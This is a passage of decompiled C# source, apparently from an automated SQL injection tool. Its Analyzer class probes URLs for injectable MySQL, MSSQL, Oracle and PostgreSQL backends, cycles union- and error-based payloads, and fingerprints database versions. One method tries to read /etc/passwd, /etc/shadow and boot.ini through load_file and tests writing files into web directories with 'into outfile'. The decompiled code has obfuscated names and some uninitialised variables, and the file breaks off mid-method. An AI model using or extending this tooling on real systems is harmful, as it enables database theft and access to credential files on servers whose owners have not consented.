using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

// Token: 0x020000F2 RID: 242
public class Analyzer
{
	// Token: 0x06001087 RID: 4231 RVA: 0x000715C4 File Offset: 0x0006F7C4
	public Analyzer(string sUrl, int bIsDumper, HTTPExt http = null)
	{
		this.stopwatch_0 = Stopwatch.StartNew();
		this.MySQLErrorType = MySQLErrorType.DuplicateEntry;
		this.MySQLCollactions = MySQLCollactions.UnHex;
		this.OracleCast = false;
		this.MSSQLCast = "char";
		this.Retry = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numHTTPRetry));
		this.Delay = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numExploitingDelay));
		this.ExploitCode = Conversions.ToString(global::Globals.GetObjectValue(global::Globals.GMain.txtAnalizerExploitCode));
		this.UnionStart = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numAnalizerUnionSart));
		this.UnionEnd = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numAnalizerUnionEnd));
		this.Timeout = Conversions.ToInteger(global::Globals.GetObjectValue(global::Globals.GMain.numHTTPTimeout));
		this.SkipMsAcessAndSybase = true;
		this.FollowRedirects = true;
		this.UnionKeyword = true;
		this.Version = "";
		this.stopwatch_1 = Stopwatch.StartNew();
		this.Keyword = "";
		this.string_5 = sUrl;
		this.OpType = bIsDumper;
		if (http == null)
		{
			if (this.OpType == 1)
			{
				this.httpext_0 = global::Globals.GMain.DumperForm.AppDomainControl_0.GetHTTP();
			}
			else if (this.OpType == 2)
			{
				this.httpext_0 = global::Globals.GMain.AppDomainControl_0.GetHTTP();
			}
		}
		else
		{
			this.httpext_0 = http;
		}
	}

	// Token: 0x06001088 RID: 4232 RVA: 0x00071738 File Offset: 0x0006F938
	public string RequestElapsed()
	{
		return Strings.FormatNumber(this.stopwatch_0.Elapsed.TotalMilliseconds / 1000.0, 2, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault);
	}

	// Token: 0x17000525 RID: 1317
	// (get) Token: 0x06001089 RID: 4233 RVA: 0x00008EF8 File Offset: 0x000070F8
	// (set) Token: 0x0600108A RID: 4234 RVA: 0x00008F00 File Offset: 0x00007100
	public MySQLErrorType MySQLErrorType { get; set; }

	// Token: 0x17000526 RID: 1318
	// (get) Token: 0x0600108B RID: 4235 RVA: 0x00008F09 File Offset: 0x00007109
	// (set) Token: 0x0600108C RID: 4236 RVA: 0x00008F11 File Offset: 0x00007111
	public MySQLCollactions MySQLCollactions { get; set; }

	// Token: 0x17000527 RID: 1319
	// (get) Token: 0x0600108D RID: 4237 RVA: 0x00008F1A File Offset: 0x0000711A
	// (set) Token: 0x0600108E RID: 4238 RVA: 0x00008F22 File Offset: 0x00007122
	public OracleErrorType OracleErrorType { get; set; }

	// Token: 0x17000528 RID: 1320
	// (get) Token: 0x0600108F RID: 4239 RVA: 0x00008F2B File Offset: 0x0000712B
	// (set) Token: 0x06001090 RID: 4240 RVA: 0x00008F33 File Offset: 0x00007133
	public bool OracleCast { get; set; }

	// Token: 0x17000529 RID: 1321
	// (get) Token: 0x06001091 RID: 4241 RVA: 0x00008F3C File Offset: 0x0000713C
	// (set) Token: 0x06001092 RID: 4242 RVA: 0x00008F44 File Offset: 0x00007144
	public PostgreSQLErrorType PostgreSQLErrorType { get; set; }

	// Token: 0x1700052A RID: 1322
	// (get) Token: 0x06001093 RID: 4243 RVA: 0x00008F4D File Offset: 0x0000714D
	// (set) Token: 0x06001094 RID: 4244 RVA: 0x00008F55 File Offset: 0x00007155
	public bool MSSQLCollate { get; set; }

	// Token: 0x1700052B RID: 1323
	// (get) Token: 0x06001095 RID: 4245 RVA: 0x00008F5E File Offset: 0x0000715E
	// (set) Token: 0x06001096 RID: 4246 RVA: 0x00008F66 File Offset: 0x00007166
	public string MSSQLCast { get; set; }

	// Token: 0x1700052C RID: 1324
	// (get) Token: 0x06001097 RID: 4247 RVA: 0x00008F6F File Offset: 0x0000716F
	// (set) Token: 0x06001098 RID: 4248 RVA: 0x00008F77 File Offset: 0x00007177
	public int Retry { get; set; }

	// Token: 0x1700052D RID: 1325
	// (get) Token: 0x06001099 RID: 4249 RVA: 0x00008F80 File Offset: 0x00007180
	// (set) Token: 0x0600109A RID: 4250 RVA: 0x00008F88 File Offset: 0x00007188
	public int Delay { get; set; }

	// Token: 0x1700052E RID: 1326
	// (get) Token: 0x0600109B RID: 4251 RVA: 0x00008F91 File Offset: 0x00007191
	// (set) Token: 0x0600109C RID: 4252 RVA: 0x00008F99 File Offset: 0x00007199
	public string ExploitCode { get; set; }

	// Token: 0x1700052F RID: 1327
	// (get) Token: 0x0600109D RID: 4253 RVA: 0x00008FA2 File Offset: 0x000071A2
	// (set) Token: 0x0600109E RID: 4254 RVA: 0x00008FAA File Offset: 0x000071AA
	public int UnionStart { get; set; }

	// Token: 0x17000530 RID: 1328
	// (get) Token: 0x0600109F RID: 4255 RVA: 0x00008FB3 File Offset: 0x000071B3
	// (set) Token: 0x060010A0 RID: 4256 RVA: 0x00008FBB File Offset: 0x000071BB
	public int UnionEnd { get; set; }

	// Token: 0x17000531 RID: 1329
	// (get) Token: 0x060010A1 RID: 4257 RVA: 0x00008FC4 File Offset: 0x000071C4
	// (set) Token: 0x060010A2 RID: 4258 RVA: 0x00008FCC File Offset: 0x000071CC
	public int Timeout { get; set; }

	// Token: 0x17000532 RID: 1330
	// (get) Token: 0x060010A3 RID: 4259 RVA: 0x00008FD5 File Offset: 0x000071D5
	// (set) Token: 0x060010A4 RID: 4260 RVA: 0x00008FDD File Offset: 0x000071DD
	public List<string> VectorsUnion { get; set; }

	// Token: 0x17000533 RID: 1331
	// (get) Token: 0x060010A5 RID: 4261 RVA: 0x00008FE6 File Offset: 0x000071E6
	// (set) Token: 0x060010A6 RID: 4262 RVA: 0x00008FEE File Offset: 0x000071EE
	public List<string> VectorsError { get; set; }

	// Token: 0x17000534 RID: 1332
	// (get) Token: 0x060010A7 RID: 4263 RVA: 0x00008FF7 File Offset: 0x000071F7
	// (set) Token: 0x060010A8 RID: 4264 RVA: 0x00008FFF File Offset: 0x000071FF
	public bool SkipMsAcessAndSybase { get; set; }

	// Token: 0x17000535 RID: 1333
	// (get) Token: 0x060010A9 RID: 4265 RVA: 0x00009008 File Offset: 0x00007208
	// (set) Token: 0x060010AA RID: 4266 RVA: 0x00009010 File Offset: 0x00007210
	public bool CheckUnionMySQLerr { get; set; }

	// Token: 0x17000536 RID: 1334
	// (get) Token: 0x060010AB RID: 4267 RVA: 0x00009019 File Offset: 0x00007219
	// (set) Token: 0x060010AC RID: 4268 RVA: 0x00009021 File Offset: 0x00007221
	public bool CheckUnionMsSQLerr { get; set; }

	// Token: 0x17000537 RID: 1335
	// (get) Token: 0x060010AD RID: 4269 RVA: 0x0000902A File Offset: 0x0000722A
	// (set) Token: 0x060010AE RID: 4270 RVA: 0x00009032 File Offset: 0x00007232
	public bool CheckUnionOracleErr { get; set; }

	// Token: 0x17000538 RID: 1336
	// (get) Token: 0x060010AF RID: 4271 RVA: 0x0000903B File Offset: 0x0000723B
	// (set) Token: 0x060010B0 RID: 4272 RVA: 0x00009043 File Offset: 0x00007243
	public bool CheckUnionPostgreErr { get; set; }

	// Token: 0x17000539 RID: 1337
	// (get) Token: 0x060010B1 RID: 4273 RVA: 0x0000904C File Offset: 0x0000724C
	// (set) Token: 0x060010B2 RID: 4274 RVA: 0x00009054 File Offset: 0x00007254
	public bool FollowRedirects { get; set; }

	// Token: 0x1700053A RID: 1338
	// (get) Token: 0x060010B3 RID: 4275 RVA: 0x0000905D File Offset: 0x0000725D
	// (set) Token: 0x060010B4 RID: 4276 RVA: 0x00009065 File Offset: 0x00007265
	public bool UnionKeyword { get; set; }

	// Token: 0x1700053B RID: 1339
	// (get) Token: 0x060010B5 RID: 4277 RVA: 0x0000906E File Offset: 0x0000726E
	// (set) Token: 0x060010B6 RID: 4278 RVA: 0x00009076 File Offset: 0x00007276
	public string ResultError { get; set; }

	// Token: 0x1700053C RID: 1340
	// (get) Token: 0x060010B7 RID: 4279 RVA: 0x0000907F File Offset: 0x0000727F
	// (set) Token: 0x060010B8 RID: 4280 RVA: 0x00009087 File Offset: 0x00007287
	public string ResultUnion { get; set; }

	// Token: 0x1700053D RID: 1341
	// (get) Token: 0x060010B9 RID: 4281 RVA: 0x00009090 File Offset: 0x00007290
	// (set) Token: 0x060010BA RID: 4282 RVA: 0x00009098 File Offset: 0x00007298
	public int ResultUnionColumn { get; set; }

	// Token: 0x1700053E RID: 1342
	// (get) Token: 0x060010BB RID: 4283 RVA: 0x000090A1 File Offset: 0x000072A1
	// (set) Token: 0x060010BC RID: 4284 RVA: 0x000090A9 File Offset: 0x000072A9
	public bool RetyFailed { get; set; }

	// Token: 0x1700053F RID: 1343
	// (get) Token: 0x060010BD RID: 4285 RVA: 0x000090B2 File Offset: 0x000072B2
	// (set) Token: 0x060010BE RID: 4286 RVA: 0x000090BA File Offset: 0x000072BA
	public Types DBType { get; set; }

	// Token: 0x17000540 RID: 1344
	// (get) Token: 0x060010BF RID: 4287 RVA: 0x000090C3 File Offset: 0x000072C3
	// (set) Token: 0x060010C0 RID: 4288 RVA: 0x000090CB File Offset: 0x000072CB
	public InjectionFormat VectorType { get; set; }

	// Token: 0x17000541 RID: 1345
	// (get) Token: 0x060010C1 RID: 4289 RVA: 0x000090D4 File Offset: 0x000072D4
	// (set) Token: 0x060010C2 RID: 4290 RVA: 0x000090DC File Offset: 0x000072DC
	public string Version { get; set; }

	// Token: 0x17000542 RID: 1346
	// (get) Token: 0x060010C3 RID: 4291 RVA: 0x00071778 File Offset: 0x0006F978
	public string GetDomain
	{
		get
		{
			return Class23.smethod_11(this.string_5);
		}
	}

	// Token: 0x17000543 RID: 1347
	// (get) Token: 0x060010C4 RID: 4292 RVA: 0x000090E5 File Offset: 0x000072E5
	// (set) Token: 0x060010C5 RID: 4293 RVA: 0x000090ED File Offset: 0x000072ED
	public bool WasRedirected { get; set; }

	// Token: 0x060010C6 RID: 4294 RVA: 0x00071794 File Offset: 0x0006F994
	public override string ToString()
	{
		string result;
		if (Conversions.ToBoolean(string.IsInterned(this.ResultUnion)))
		{
			result = this.ResultError;
		}
		else
		{
			result = this.ResultUnion;
		}
		return result;
	}

	// Token: 0x17000544 RID: 1348
	// (get) Token: 0x060010C7 RID: 4295 RVA: 0x000090F6 File Offset: 0x000072F6
	// (set) Token: 0x060010C8 RID: 4296 RVA: 0x000090FE File Offset: 0x000072FE
	public List<int> KnowUrlPositions { get; set; }

	// Token: 0x17000545 RID: 1349
	// (get) Token: 0x060010C9 RID: 4297 RVA: 0x00009107 File Offset: 0x00007307
	// (set) Token: 0x060010CA RID: 4298 RVA: 0x0000910F File Offset: 0x0000730F
	public string KnowUrlInjectPoint { get; set; }

	// Token: 0x17000546 RID: 1350
	// (get) Token: 0x060010CB RID: 4299 RVA: 0x00009118 File Offset: 0x00007318
	// (set) Token: 0x060010CC RID: 4300 RVA: 0x00009120 File Offset: 0x00007320
	public bool HtmlOriginalShowSQL { get; set; }

	// Token: 0x17000547 RID: 1351
	// (get) Token: 0x060010CD RID: 4301 RVA: 0x00009129 File Offset: 0x00007329
	// (set) Token: 0x060010CE RID: 4302 RVA: 0x00009131 File Offset: 0x00007331
	public bool KnowUrlInjectPointWithComment { get; set; }

	// Token: 0x17000548 RID: 1352
	// (get) Token: 0x060010CF RID: 4303 RVA: 0x0000913A File Offset: 0x0000733A
	// (set) Token: 0x060010D0 RID: 4304 RVA: 0x00009142 File Offset: 0x00007342
	public int OpType { get; set; }

	// Token: 0x17000549 RID: 1353
	// (get) Token: 0x060010D1 RID: 4305 RVA: 0x0000914B File Offset: 0x0000734B
	// (set) Token: 0x060010D2 RID: 4306 RVA: 0x00009153 File Offset: 0x00007353
	public string Keyword { get; set; }

	// Token: 0x14000013 RID: 19
	// (add) Token: 0x060010D3 RID: 4307 RVA: 0x000717C4 File Offset: 0x0006F9C4
	// (remove) Token: 0x060010D4 RID: 4308 RVA: 0x000717FC File Offset: 0x0006F9FC
	public event Analyzer.OnProgressEventHandler OnProgress
	{
		[CompilerGenerated]
		add
		{
			Analyzer.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
			Analyzer.OnProgressEventHandler onProgressEventHandler2;
			do
			{
				onProgressEventHandler2 = onProgressEventHandler;
				Analyzer.OnProgressEventHandler value2 = (Analyzer.OnProgressEventHandler)Delegate.Combine(onProgressEventHandler2, value);
				onProgressEventHandler = Interlocked.CompareExchange<Analyzer.OnProgressEventHandler>(ref this.onProgressEventHandler_0, value2, onProgressEventHandler2);
			}
			while (onProgressEventHandler != onProgressEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			Analyzer.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
			Analyzer.OnProgressEventHandler onProgressEventHandler2;
			do
			{
				onProgressEventHandler2 = onProgressEventHandler;
				Analyzer.OnProgressEventHandler value2 = (Analyzer.OnProgressEventHandler)Delegate.Remove(onProgressEventHandler2, value);
				onProgressEventHandler = Interlocked.CompareExchange<Analyzer.OnProgressEventHandler>(ref this.onProgressEventHandler_0, value2, onProgressEventHandler2);
			}
			while (onProgressEventHandler != onProgressEventHandler2);
		}
	}

	// Token: 0x1700054A RID: 1354
	// (get) Token: 0x060010D5 RID: 4309 RVA: 0x00071834 File Offset: 0x0006FA34
	internal HTTPExt HTTPExt_0
	{
		get
		{
			return this.httpext_0;
		}
	}

	// Token: 0x060010D6 RID: 4310 RVA: 0x0000915C File Offset: 0x0000735C
	public bool IsExploitable(string html)
	{
		return this.IsExploitable(Class54.smethod_3(html));
	}

	// Token: 0x060010D7 RID: 4311 RVA: 0x0007184C File Offset: 0x0006FA4C
	public bool IsExploitable(Types db)
	{
		if (db <= Types.Unknown)
		{
			if (db == Types.None)
			{
				return false;
			}
			if (db == Types.Unknown)
			{
				return false;
			}
		}
		else
		{
			if (db == Types.MsAccess)
			{
				return !this.SkipMsAcessAndSybase;
			}
			if (db == Types.Sybase)
			{
				return !this.SkipMsAcessAndSybase;
			}
		}
		return true;
	}

	// Token: 0x060010D8 RID: 4312 RVA: 0x00071898 File Offset: 0x0006FA98
	public Types CheckExploit(string sUrl = "")
	{
		int num = 1;
		List<string> list = new List<string>();
		if (string.IsNullOrEmpty(sUrl))
		{
			list = Class23.smethod_17(this.string_5, this.ExploitCode, false, true);
		}
		else
		{
			list.Add(sUrl);
		}
		this.KnowUrlPositions = new List<int>();
		checked
		{
			Types types;
			try
			{
				foreach (string string_ in list)
				{
					Analyzer.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
					if (onProgressEventHandler != null)
					{
						onProgressEventHandler(this, string.Concat(new string[]
						{
							"[",
							Conversions.ToString(num),
							"/",
							Conversions.ToString(list.Count),
							"] ",
							global::Globals.translate_0.GetStr(global::Globals.GMain, 117, "")
						}), global::Globals.FormatPercentage(num, list.Count));
					}
					num++;
					types = this.method_12(string_);
					if (this.httpext_0.WasRedirected() && !this.IsExploitable(types))
					{
						this.FollowRedirects = false;
						types = this.method_12(string_);
						if (!this.IsExploitable(types))
						{
							this.FollowRedirects = true;
						}
					}
					if (this.IsExploitable(types))
					{
						this.KnowUrlPositions.Add(num);
						if (!Class54.smethod_10(types) & this.IsExploitable(types))
						{
							this.DBType = types;
							break;
						}
					}
					else if (this.UnionKeyword)
					{
						this.KnowUrlPositions.Add(num);
					}
					bool flag;
					if (!flag && !global::Globals.GMain.method_23())
					{
						continue;
					}
					break;
				}
			}
			finally
			{
				List<string>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			if (this.IsExploitable(types))
			{
				this.DBType = types;
			}
			return this.DBType;
		}
	}

	// Token: 0x060010D9 RID: 4313 RVA: 0x0000916A File Offset: 0x0000736A
	public bool TryErrorBasead()
	{
		return this.method_1(InjectionType.Error);
	}

	// Token: 0x060010DA RID: 4314 RVA: 0x00009173 File Offset: 0x00007373
	public bool TryUnionBasead()
	{
		return this.method_1(InjectionType.Union);
	}

	// Token: 0x060010DB RID: 4315 RVA: 0x00071A60 File Offset: 0x0006FC60
	public bool CheckVersionNoCollactions(string url, bool checkRedirects = false)
	{
		string url2 = "";
		List<string> list = new List<string>();
		Analyzer.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
		if (onProgressEventHandler != null)
		{
			onProgressEventHandler(this, global::Globals.translate_0.GetStr(global::Globals.GMain, 118, ""), -1);
		}
		bool flag;
		if ((flag = true) == Class54.smethod_9(this.DBType))
		{
			list.Add("version()");
		}
		else if (flag == Class54.smethod_10(this.DBType))
		{
			list.Add("@@version");
		}
		else if (flag == Class54.smethod_11(this.DBType))
		{
			list.Add("(select banner from v$version where banner like " + Class23.smethod_21("%Oracle%", false, "||", "chr") + ")");
		}
		else
		{
			if (flag != Class54.smethod_12(this.DBType))
			{
				return false;
			}
			list.Add("version()");
		}
		InjectionType injectionType;
		if (url.ToLower().Contains("union"))
		{
			injectionType = InjectionType.Union;
		}
		else
		{
			injectionType = InjectionType.Error;
		}
		if ((this.VectorType == InjectionFormat.String | this.DBType == Types.Oracle_With_Error) && Class54.smethod_11(this.DBType) && this.OracleErrorType == OracleErrorType.NONE)
		{
			this.OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
		}
		checked
		{
			List<string> list2;
			bool flag3;
			for (;;)
			{
				list2 = new List<string>();
				do
				{
					bool flag2;
					int num;
					if ((flag2 = true) == Class54.smethod_9(this.DBType))
					{
						if (injectionType == InjectionType.Union)
						{
							switch (num)
							{
							case 0:
								url2 = MySQLNoError.Info(url, MySQLCollactions.UnHex, false, list, "");
								this.MySQLCollactions = MySQLCollactions.UnHex;
								goto IL_2E3;
							case 1:
								url2 = MySQLNoError.Info(url, MySQLCollactions.None, false, list, "");
								this.MySQLCollactions = MySQLCollactions.None;
								goto IL_2E3;
							case 2:
								url2 = MySQLNoError.Info(url, MySQLCollactions.Binary, false, list, "");
								this.MySQLCollactions = MySQLCollactions.Binary;
								goto IL_2E3;
							case 3:
								url2 = MySQLNoError.Info(url, MySQLCollactions.CastAsChar, false, list, "");
								this.MySQLCollactions = MySQLCollactions.CastAsChar;
								goto IL_2E3;
							}
							break;
						}
						if (num == 0)
						{
							this.MySQLCollactions = MySQLCollactions.UnHex;
						}
						else
						{
							this.MySQLCollactions = MySQLCollactions.None;
						}
						switch (num)
						{
						case 0:
							this.MySQLErrorType = MySQLErrorType.UpdateXML;
							goto IL_3F0;
						case 1:
							this.MySQLErrorType = MySQLErrorType.DuplicateEntry;
							goto IL_3F0;
						case 2:
							this.MySQLErrorType = MySQLErrorType.ExtractValue;
							goto IL_3F0;
						}
						break;
						IL_3F0:
						url2 = MySQLWithError.Info(url, this.MySQLCollactions, this.MySQLErrorType, list, "");
					}
					else
					{
						if (flag2 == Class54.smethod_10(this.DBType))
						{
							switch (num)
							{
							case 0:
								url2 = MSSQL.Info(url, injectionType, this.MSSQLCollate, list, "char", "");
								this.MSSQLCast = "char";
								goto IL_2E3;
							case 1:
								url2 = MSSQL.Info(url, injectionType, this.MSSQLCollate, list, "", "");
								this.MSSQLCast = "";
								goto IL_2E3;
							case 2:
								url2 = MSSQL.Info(url, injectionType, this.MSSQLCollate, list, "nvarchar", "");
								this.MSSQLCast = "nvarchar";
								goto IL_2E3;
							case 3:
								this.MSSQLCollate = false;
								url2 = MSSQL.Info(url, injectionType, this.MSSQLCollate, list, "char", "");
								this.MSSQLCast = "char";
								goto IL_2E3;
							case 4:
								url2 = MSSQL.Info(url, injectionType, this.MSSQLCollate, list, "", "");
								this.MSSQLCast = "";
								goto IL_2E3;
							}
							break;
						}
						if (flag2 == Class54.smethod_11(this.DBType))
						{
							if (num != 0)
							{
								if (num != 1)
								{
									break;
								}
								this.OracleCast = !this.OracleCast;
								url2 = Oracle.Info(url, injectionType, this.OracleErrorType, list, this.OracleCast, "");
							}
							else
							{
								url2 = Oracle.Info(url, injectionType, this.OracleErrorType, list, this.OracleCast, "");
							}
						}
						else if (flag2 == Class54.smethod_12(this.DBType))
						{
							if (injectionType == InjectionType.Union)
							{
								this.PostgreSQLErrorType = PostgreSQLErrorType.NONE;
							}
							else
							{
								this.PostgreSQLErrorType = PostgreSQLErrorType.CAST_INT;
							}
							if (num > 0)
							{
								break;
							}
							url2 = PostgreSQL.Info(url, injectionType, this.PostgreSQLErrorType, list, "");
						}
					}
					IL_2E3:
					list2 = this.HTML_ParseHtmlData(url2);
					flag3 = (list2.Count > 0);
					num++;
					if (flag3 | this.RetyFailed)
					{
						break;
					}
				}
				while (!this.method_0());
				IL_429:
				if (flag3)
				{
					break;
				}
				if (checkRedirects && (this.WasRedirected & this.FollowRedirects))
				{
					int num = 0;
					this.FollowRedirects = false;
					checkRedirects = false;
					continue;
				}
				goto IL_46B;
				goto IL_429;
			}
			this.Version = this.method_10(list2[0]);
			IL_46B:
			return flag3;
		}
	}

	// Token: 0x060010DC RID: 4316 RVA: 0x00071EE4 File Offset: 0x000700E4
	public List<string> GetInfo(string url, string sColumn)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list.Add(sColumn);
		InjectionType injectionType;
		if (url.ToLower().Contains("union"))
		{
			injectionType = InjectionType.Union;
		}
		else
		{
			injectionType = InjectionType.Error;
		}
		bool flag;
		if ((flag = true) == Class54.smethod_9(this.DBType))
		{
			if (injectionType == InjectionType.Error)
			{
				url = MySQLWithError.Info(url, this.MySQLCollactions, this.MySQLErrorType, list, "");
			}
			else
			{
				url = MySQLNoError.Info(url, this.MySQLCollactions, false, list, "");
			}
		}
		else if (flag == Class54.smethod_10(this.DBType))
		{
			url = MSSQL.Info(url, injectionType, this.MSSQLCollate, list, this.MSSQLCast, "");
		}
		else if (flag == Class54.smethod_11(this.DBType))
		{
			url = Oracle.Info(url, injectionType, this.OracleErrorType, list, this.OracleCast, "");
		}
		else if (flag == Class54.smethod_12(this.DBType))
		{
			url = PostgreSQL.Info(url, injectionType, this.PostgreSQLErrorType, list, "");
		}
		return this.HTML_ParseHtmlData(url);
	}

	// Token: 0x060010DD RID: 4317 RVA: 0x00072004 File Offset: 0x00070204
	public bool CheckMySQL_File(string url, ref string sReadPath, ref string sWritePath)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		List<string> list3 = new List<string>();
		checked
		{
			bool result;
			if (this.DBType != Types.MySQL_No_Error)
			{
				result = false;
			}
			else
			{
				if (this.webServer_0 == global::Globals.WebServer.WINDOWS)
				{
					list.Add("c:\\\\");
					list.Add("c:\\");
					list.Add("d:\\\\");
					list.Add("e:\\\\");
					list.Add("c://");
					list.Add("c:/");
					list2.Add("c:\\\\boot.ini");
					list2.Add("c:\\boot.ini");
					list2.Add("c:/boot.ini");
					list2.Add("c://boot.ini");
					list2.Add("d:\\\\boot.ini");
					list2.Add("e:\\\\boot.ini");
				}
				else
				{
					list.Add("");
					list.Add("/var/www/");
					list.Add("/var/www/");
					list.Add("/tmp/");
					list.Add("/etc/passwd/");
					list.Add("/etc/shadow/");
					list2.Add("/etc/passwd");
					list2.Add("/etc/shadow");
					list2.Add("/etc/group");
					list2.Add("\\etc\\passwd");
					list2.Add("//etc//passwd");
				}
				if (this.method_8(url))
				{
					Analyzer.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
					if (onProgressEventHandler != null)
					{
						onProgressEventHandler(this, "load_file: user_privileges", -1);
					}
					sReadPath = "user_privileges";
				}
				try
				{
					foreach (string text in list2)
					{
						int num;
						num++;
						Analyzer.OnProgressEventHandler onProgressEventHandler2 = this.onProgressEventHandler_0;
						if (onProgressEventHandler2 != null)
						{
							onProgressEventHandler2(this, string.Concat(new string[]
							{
								"[",
								Conversions.ToString(num),
								"/",
								Conversions.ToString(list2.Count),
								"] load_file: ",
								text
							}), global::Globals.FormatPercentage(num, list2.Count));
						}
						list3 = this.GetInfo(url, "load_file(" + Class23.smethod_20(text) + ")");
						if (list3.Count > 0)
						{
							if (string.IsNullOrEmpty(sReadPath))
							{
								sReadPath = text;
							}
							else
							{
								sReadPath = text + " : " + sReadPath;
							}
							break;
						}
					}
				}
				finally
				{
					List<string>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				Analyzer.OnProgressEventHandler onProgressEventHandler3 = this.onProgressEventHandler_0;
				if (onProgressEventHandler3 != null)
				{
					onProgressEventHandler3(this, global::Globals.translate_0.GetStr(global::Globals.GMain, 119, ""), -1);
				}
				list3 = this.GetInfo(url, "'1234ABCS45D0999'");
				if (list3.Count > 0)
				{
					string str = DateAndTime.Now.Ticks.ToString();
					int num = 0;
					try
					{
						foreach (string text2 in list)
						{
							num++;
							Analyzer.OnProgressEventHandler onProgressEventHandler4 = this.onProgressEventHandler_0;
							if (onProgressEventHandler4 != null)
							{
								onProgressEventHandler4(this, string.Concat(new string[]
								{
									"[",
									Conversions.ToString(num),
									"/",
									Conversions.ToString(list.Count),
									"] ",
									global::Globals.translate_0.GetStr(global::Globals.GMain, 120, ""),
									text2
								}), global::Globals.FormatPercentage(num, list.Count));
							}
							text2 += str;
							this.GetInfo(url, Class23.smethod_20("123ABC") + " into outfile '" + text2 + "'");
							list3 = this.GetInfo(url, "load_file(" + Class23.smethod_20(text2) + ")");
							if (list3.Count > 0)
							{
								sWritePath = text2;
								break;
							}
						}
					}
					finally
					{
						List<string>.Enumerator enumerator2;
						((IDisposable)enumerator2).Dispose();
					}
				}
				result = (!string.IsNullOrEmpty(sReadPath) | !string.IsNullOrEmpty(sWritePath));
			}
			return result;
		}
	}

	// Token: 0x060010DE RID: 4318 RVA: 0x0000917C File Offset: 0x0000737C
	public void Dispose()
	{
		if (this.httpext_0 != null)
		{
			this.httpext_0.Dispose();
		}
	}

	// Token: 0x060010DF RID: 4319 RVA: 0x00072410 File Offset: 0x00070610
	public void Reset()
	{
		this.VectorType = InjectionFormat.None;
		this.DBType = Types.None;
		this.RetyFailed = false;
		this.ResultUnion = string.Empty;
		this.ResultUnionColumn = 0;
		this.ResultError = string.Empty;
		this.KnowUrlInjectPoint = string.Empty;
		this.KnowUrlPositions = null;
		this.HtmlOriginalShowSQL = false;
		this.KnowUrlInjectPointWithComment = false;
	}

	// Token: 0x060010E0 RID: 4320 RVA: 0x00072470 File Offset: 0x00070670
	private bool method_0()
	{
		bool result;
		if (this.OpType == 1)
		{
			result = global::Globals.GMain.DumperForm.WorkedRequestStop();
		}
		else if (this.OpType == 0)
		{
			result = global::Globals.GMain.method_23();
		}
		return result;
	}

	// Token: 0x060010E1 RID: 4321 RVA: 0x000724B4 File Offset: 0x000706B4
	private bool method_1(InjectionType injectionType_0)
	{
		List<string> list = new List<string>();
		List<string> list2;
		if (injectionType_0 == InjectionType.Error)
		{
			list2 = this.VectorsError;
		}
		else
		{
			list2 = this.VectorsUnion;
		}
		checked
		{
			bool flag;
			try
			{
				foreach (string text in list2)
				{
					switch (this.VectorType)
					{
					case InjectionFormat.Integer:
						if (text.Contains("'"))
						{
							continue;
						}
						break;
					case InjectionFormat.String:
						if (!text.Contains("'"))
						{
							continue;
						}
						break;
					}
					if (injectionType_0 == InjectionType.Union)
					{
						if (Class54.smethod_11(this.DBType))
						{
							text = text.Replace("[t]", "[t] from dual");
						}
						if (Class54.smethod_9(this.DBType) && this.Version.StartsWith("4"))
						{
							return false;
						}
					}
					List<string> list3;
					if (!string.IsNullOrEmpty(this.KnowUrlInjectPoint))
					{
						if (this.KnowUrlInjectPointWithComment)
						{
							if (!text.EndsWith("--"))
							{
								continue;
							}
						}
						else if (text.EndsWith("--"))
						{
							continue;
						}
						list3 = new List<string>();
						list3.Add(this.KnowUrlInjectPoint.Replace("[t]", text));
					}
					else
					{
						list3 = Class23.smethod_17(this.string_5, text, false, Operators.CompareString(text.Substring(0, 1), "[", false) != 0 & (text.StartsWith("'") | text.StartsWith(" ")));
						if (injectionType_0 == InjectionType.Union)
						{
							list = Class23.smethod_17(this.string_5, "[t]", false, Operators.CompareString(text.Substring(0, 1), "[", false) != 0 & (text.StartsWith("'") | text.StartsWith(" ")));
						}
					}
					int num;
					num++;
					this.RetyFailed = false;
					int num2 = list3.Count - 1;
					for (int i = 0; i <= num2; i++)
					{
						string text2 = list3[i];
						if (injectionType_0 == InjectionType.Error)
						{
							Analyzer.OnProgressEventHandler onProgressEventHandler = this.onProgressEventHandler_0;
							if (onProgressEventHandler != null)
							{
								onProgressEventHandler(this, string.Concat(new string[]
								{
									"[",
									Conversions.ToString(num),
									"/",
									Conversions.ToString(list2.Count),
									"] ",
									global::Globals.translate_0.GetStr(global::Globals.GMain, 121, ""),
									": ",
									text
								}), global::Globals.FormatPercentage(num + 1, list2.Count * list3.Count));
							}
							flag = this.method_2(text2);
						}
						else
						{
							this.bool_11 = false;
							if ((this.UnionKeyword & list.Count > 0) && !flag)
							{
								this.Keyword = this.method_7(list[0]);
							}
							Analyzer.OnProgressEventHandler onProgressEventHandler2 = this.onProgressEventHandler_0;
							if (onProgressEventHandler2 != null)
							{
								onProgressEventHandler2(this, string.Concat(new string[]
								{
									"[",
									Conversions.ToString(num),
									"/",
									Conversions.ToString(list2.Count),
									"] ",
									global::Globals.translate_0.GetStr(global::Globals.GMain, 122, ""),
									": ",
									text
								}), global::Globals.FormatPercentage(num + 1, list2.Count * list3.Count));
							}
							flag = this.method_3(text2);
						}
						if (flag)
						{
							if (injectionType_0 == InjectionType.Error)
							{
								this.ResultError = text2;
								this.KnowUrlInjectPoint = text2.Replace(text, "[t]");
								this.KnowUrlInjectPointWithComment = text.EndsWith("--");
							}
